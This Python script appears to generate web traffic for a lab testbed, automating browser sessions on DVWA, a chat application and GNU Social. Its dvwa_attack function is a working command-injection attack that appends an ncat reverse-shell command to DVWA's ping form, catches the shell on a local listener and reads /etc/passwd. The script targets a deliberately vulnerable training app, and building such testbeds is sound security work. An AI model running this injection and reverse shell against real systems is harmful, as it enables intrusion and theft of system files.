import os
import time
import pprint
import random
import socket
import getpass
import datetime
import threading
from colorama import Fore, Style
from essential_generators import DocumentGenerator
from webLib import create_driver, dvwa_login, dvwa_command_injection, dvwa_xss_reflected, move_2_link, change_security, chat_web_application_login, chat_web_application_signup_, chat_web_application_search_user, chat_web_application_send_msg, chat_web_application_logout, gnu_social_register_account, gnu_social_login, gnu_social_send_status, gnu_social_read_timeline

def dvwa(args):
    base_url = args["url"]
    username = "admin"
    password = "password"
    driver = create_driver(proxy=args["proxy"])
    driver.implicitly_wait(10)

    actions = ["dvwa_command_injection","dvwa_xss_reflected","move_2_link"]

    dvwa_login(driver, base_url, username, password)
    for i in range(int(args["nb_actions"])):
        action = random.choices(actions, weights=[5,5,5])
        time.sleep(random.randint(2,20))
        if action == ["dvwa_command_injection"]:
            change_security(driver, base_url)
            dvwa_command_injection(driver, base_url, "8.8.8.8")
        elif action == ["dvwa_xss_reflected"]:
            dvwa_xss_reflected(driver, base_url, getpass.getuser())
        elif action == ["move_2_link"]:
            move_2_link(driver)

    driver.close()
    driver.quit()

def dvwa_attack(args):
    ##### Prepare attack hacker side
    my_port = random.randint(4000,4999)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((('',my_port)))
    s.listen(10)

    ##### Attack victim side
    base_url = args["url"]
    username = "admin"
    password = "password"
    # my_ip = socket.gethostbyname(socket.gethostname())
    my_ip = os.popen("hostname -I").read().split(" ")[0]
    driver = create_driver()
    driver.implicitly_wait(10)

    dvwa_login(driver, base_url, username, password)
    change_security(driver, base_url)
    dvwa_command_injection(driver, base_url, "8.8.8.8; ncat "+my_ip+" "+str(my_port)+" -e /bin/bash")

    ##### Attack hacker side
    while True:
        s.settimeout(60)
        s.listen(5)
        try:
            client, address = s.accept()
        except:
            print(Fore.RED+"Attack failed!"+Style.RESET_ALL)
            break
        print(address,"connected!")
        if address:
            current_time = time.strftime("%H:%M:%S", time.localtime())
            print("Attack begin at:",current_time)
            client.send(b'cat /etc/passwd\n')
        response = client.recv(1024)
        if response != "":
            print(Fore.GREEN+"Attack was successfull!"+Style.RESET_ALL)
            print(response)
            break

    s.close()
    driver.close()
    driver.quit()

def chat_web_application_signup(args):
    base_url = args["url"]
    username = args["username"]
    email = args["email"]
    password = args["password"]
    driver = create_driver(proxy=args["proxy"])
    driver.implicitly_wait(10)

    chat_web_application_signup_(driver, base_url, username, email, password)

    driver.close()
    driver.quit()

def chat_web_application(args):
    base_url = args["url"]
    username = args["username"]
    receivers = args["receivers"]
    password = args["password"]
    
    gen = DocumentGenerator()

    driver = create_driver(proxy=args["proxy"])
    driver.implicitly_wait(10)

    if chat_web_application_login(driver, base_url, username, password, verbose=False) == 0:
        for i in range(int(args["nb_actions"])):
            receiver = random.choice(receivers)
            if chat_web_application_search_user(driver, receiver, verbose=False) == 0:
                chat_web_application_send_msg(driver, receiver, gen.sentence())
    
        chat_web_application_logout(driver, verbose=False)
    time.sleep(10)
    driver.close()
    driver.quit()

def gnu_social_signup(args):
    url = args["url"]
    nickname = args["nickname"]
    password = args["password"]
    email = args["email"]
    fullname = args["fullname"]
    bio = args["bio"]
    location = args["location"]

    driver = create_driver(proxy=args["proxy"])
    driver.implicitly_wait(10)

    gnu_social_register_account(driver, url, nickname, password, email, fullname, bio, location, verbose=True)

    time.sleep(4)
    driver.close()
    driver.quit()

def gnu_social(args):
    url = args["url"]
    nickname = args["nickname"]
    password = args["password"]

    driver = create_driver(proxy=args["proxy"])
    driver.implicitly_wait(10)

    gen = DocumentGenerator()

    if gnu_social_login(driver, url, nickname, password, verbose=False) == 0:
        gnu_social_send_status(driver, url, gen.sentence())
    # gnu_social_read_timeline(driver, url)
    time.sleep(4)
    driver.close()
    driver.quit()

# args = {}
# args["nb_actions"] = "1"
# args["url"] = "http://10.159.8.15/"
# args["nickname"] = "test"
# args["password"] = "test123"
# args["email"] = "test@company.com"
# args["fullname"] = "Mr Test"
# args["bio"] = "Bonjour je suis Mr Test"
# args["location"] = "Paris"
# args["proxy"] = ""

# gnu_social(args)